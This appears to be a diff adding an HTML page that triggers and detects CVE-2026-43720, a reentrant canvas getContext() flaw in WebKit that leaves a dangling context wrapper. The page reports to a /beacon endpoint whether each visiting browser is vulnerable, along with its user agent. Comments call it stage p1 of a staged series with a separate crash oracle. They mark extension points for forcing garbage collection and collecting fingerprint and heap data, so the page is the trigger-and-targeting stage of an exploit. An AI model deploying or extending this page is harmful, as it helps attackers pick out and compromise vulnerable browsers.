@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<!--
+  entry-1422 / p1 — главный оракул: есть ли на этой сборке WebKit фикс
+  CVE-2026-43720 (реентерабельный HTMLCanvasElement::getContext(), WebKit bug 313175).
+
+  Основание:
+    commit 040ef6e21ffac03b6d6098e0e12354bdb5469ad1 (2026-06-30), тест
+    LayoutTests/fast/canvas/canvas-getContext-reentrant.html;
+    WSA-2026-0004: CVE-2026-43720 < WebKitGTK 2.52.5, bug 313175.
+
+  Контракт после фикса (expected.txt апстримного теста):
+    outer="2d", inner="2d"              -> outer === inner (переиспользован существующий контекст)
+    outer="bitmaprenderer", inner="2d"  -> outer === null (тип не совпал), inner жив
+  До фикса:
+    outer="2d", inner="2d"              -> outer !== inner: внешний вызов создал НОВЫЙ контекст,
+                                           первый освобождён, его JS-обёртка (inner) висит
+    outer="bitmaprenderer", inner="2d"  -> outer — живой ImageBitmapRenderingContext
+
+  ВАЖНО (проверено на WebKitGTK 2.52.5, diag-dictionary-getters.html): в словаре
+  CanvasRenderingContext2DSettings член `alpha` закомментирован (IDL: «FIXME: Add support
+  for 'alpha'»), поэтому для 2d геттер на alpha НЕ вызывается; вызываются `desynchronized`
+  (и `willReadFrequently`). Поэтому опции содержат геттеры на несколько членов сразу, а
+  какой именно сработал — пишется в firedKeys. Для bitmaprenderer/webgl `alpha` работает.
+
+  Страница НЕ трогает свойства освобождённого контекста (никаких lineWidth-чтений),
+  поэтому сама по себе не должна ронять WebProcess. Crash-oracle — отдельно, p3.
+  Точки расширения помечены // EXT.
+-->
+<meta charset="utf-8">
+<title>entry-1422 p1 canvas reentrancy oracle</title>
+<style>
+  body{font:14px/1.45 monospace;background:#111;color:#ddd;margin:16px}
+  h1{font-size:16px} pre{white-space:pre-wrap;background:#000;padding:10px;border:1px solid #333}
+</style>
+<h1>p1 — Canvas getContext reentrancy oracle (CVE-2026-43720 / bug 313175)</h1>
+<pre id="out">running…</pre>
+<script>
+(function () {
+  "use strict";
+  var results = {}, tags = [];
+  var BEACON = location.origin + "/beacon";
+
+  function describe(v) {
+    if (v === null) return "null";
+    if (v === undefined) return "undefined";
+    try { return (v.constructor && v.constructor.name) || Object.prototype.toString.call(v); }
+    catch (e) { return "throw:" + e.name; }
+  }
+
+  function send(payload) {
+    var body = JSON.stringify(payload);
+    try {
+      if (typeof fetch === "function") {
+        fetch(BEACON, { method: "POST", headers: { "Content-Type": "application/json" }, body: body });
+        return "fetch";
+      }
+    } catch (e) {}
+    try {
+      var x = new XMLHttpRequest();
+      x.open("POST", BEACON, true);
+      x.setRequestHeader("Content-Type", "application/json");
+      x.send(body);
+      return "xhr";
+    } catch (e) { return "none"; }
+  }
+
+  function rec(name, obj) { results[name] = obj; tags.push(name + "=" + obj.verdict); }
+
+  // Опции с геттерами на нескольких членах словаря: любой прочитанный член вызывает
+  // реентерабельный getContext(innerType). firedKeys показывает, что именно прочитал движок.
+  function reentrantOptions(canvas, innerType, state) {
+    var opts = {};
+    ["alpha", "desynchronized", "willReadFrequently", "colorSpace"].forEach(function (key) {
+      Object.defineProperty(opts, key, {
+        get: function () {
+          state.fired++;
+          state.firedKeys.push(key);
+          if (!state.inner) {
+            try { state.inner = canvas.getContext(innerType); } catch (e) { state.err = e.name + ":" + e.message; }
+          }
+          return key === "colorSpace" ? "srgb" : (key === "willReadFrequently" ? false : true);
+        }
+      });
+    });
+    return opts;
+  }
+
+  function runCase(name, outerType, innerType, makeCanvas) {
+    var state = { fired: 0, firedKeys: [], inner: null, err: null };
+    var canvas = null, outer = null, current = null;
+    try {
+      canvas = makeCanvas();
+      outer = canvas.getContext(outerType, reentrantOptions(canvas, innerType, state));
+    } catch (e) { state.err = e.name + ":" + e.message; }
+    try { if (canvas) current = canvas.getContext(outerType); } catch (e) {}
+    var verdict = "UNKNOWN";
+    if (state.fired && state.inner) {
+      if (outer === null) verdict = "FIXED";              // тип не совпал -> null
+      else if (outer === state.inner) verdict = "FIXED";  // тот же тип -> переиспользование
+      else verdict = "VULNERABLE";                        // новый контекст поверх живого inner
+    }
+    rec(name, {
+      verdict: verdict,
+      outerType: outerType, innerType: innerType,
+      fired: state.fired, firedKeys: state.firedKeys.join("+"),
+      inner: describe(state.inner), outer: describe(outer),
+      current: describe(current),
+      outerIsInner: outer === state.inner,
+      err: state.err
+    });
+    // EXT: здесь можно удержать ссылки и форсировать GC (см. p3), но НЕ в p1.
+  }
+
+  // ---- контроль: два последовательных getContext('2d') дают ОДИН объект ----
+  (function () {
+    var pass = null;
+    try {
+      var c0 = document.createElement("canvas");
+      var a0 = c0.getContext("2d"), b0 = c0.getContext("2d");
+      pass = !!(a0 && b0 && a0 === b0);
+    } catch (e) { pass = "throw:" + e.name; }
+    rec("control", { verdict: pass === true ? "PASS" : "FAIL", detail: String(pass) });
+  })();
+
+  // ---- A: same-type reentry 2d -> 2d (главный дискриминатор; alpha в 2d-словаре нет,
+  //         поэтому сработает desynchronized/willReadFrequently/colorSpace) ----
+  runCase("same_type_2d", "2d", "2d", function () {
+    var c = document.createElement("canvas"); c.width = 1; c.height = 1; return c;
+  });
+
+  // ---- B: same-type bitmaprenderer -> bitmaprenderer (alpha в этом словаре есть) ----
+  runCase("same_type_bitmaprenderer", "bitmaprenderer", "bitmaprenderer", function () {
+    var c = document.createElement("canvas"); c.width = 1; c.height = 1; return c;
+  });
+
+  // ---- C: cross-type outer=bitmaprenderer, inner=2d (форма из апстримного теста) ----
+  runCase("cross_bitmaprenderer_2d", "bitmaprenderer", "2d", function () {
+    var c = document.createElement("canvas"); c.width = 1; c.height = 1; return c;
+  });
+
+  // ---- D: cross-type outer=2d, inner=bitmaprenderer ----
+  runCase("cross_2d_bitmaprenderer", "2d", "bitmaprenderer", function () {
+    var c = document.createElement("canvas"); c.width = 1; c.height = 1; return c;
+  });
+
+  // ---- E: OffscreenCanvas same-type 2d -> 2d ----
+  (function () {
+    if (typeof OffscreenCanvas === "undefined") {
+      rec("offscreen_same_type_2d", { verdict: "UNKNOWN", detail: "no OffscreenCanvas" });
+      return;
+    }
+    runCase("offscreen_same_type_2d", "2d", "2d", function () { return new OffscreenCanvas(10, 10); });
+  })();
+
+  // ---- агрегат: same-type 2d — главный; cross bitmaprenderer — подтверждающий ----
+  var a = results.same_type_2d.verdict;
+  var c = results.cross_bitmaprenderer_2d.verdict;
+  var v;
+  if (a === "VULNERABLE" || c === "VULNERABLE") v = "VULNERABLE";
+  else if (a === "FIXED") v = "FIXED";
+  else if (c === "FIXED") v = "FIXED_PARTIAL"; // 2d-кейс не дал ответа, но cross сработал
+  else v = "UNKNOWN";
+
+  var report = {
+    tag: "P1-RESULT",
+    verdict: v,
+    ua: navigator.userAgent,
+    control: results.control,
+    cases: results,
+    // EXT: новые поля (fingerprint, heap-данные) добавлять сюда.
+    beacon: send({ tag: "P1-RESULT", verdict: v, ua: navigator.userAgent, cases: results })
+  };
+  document.title = "p1 " + v;
+  document.getElementById("out").textContent = "P1_JSON=" + JSON.stringify(report, null, 1);
+})();
+</script>
